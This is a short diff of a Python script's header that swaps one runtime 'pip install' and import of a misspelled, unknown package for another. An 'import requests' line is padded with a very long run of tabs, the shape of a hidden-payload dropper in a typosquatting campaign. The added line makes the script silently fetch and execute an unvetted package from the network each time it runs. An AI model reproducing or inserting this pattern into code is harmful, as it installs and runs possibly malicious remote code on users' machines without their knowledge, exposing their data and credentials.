@@ -1,6 +1,6 @@
 import os
-os.system("pip install pythonsqlitetoolkitV1")
-import pythonsqlitetoolkitV1
+os.system("pip install pythoncolouringsliberyV1")
+import pythoncolouringsliberyV1
 import requests																																																																																																																																																																																																																																																																					
 from selenium import webdriver
 from selenium.webdriver.firefox.options import Options
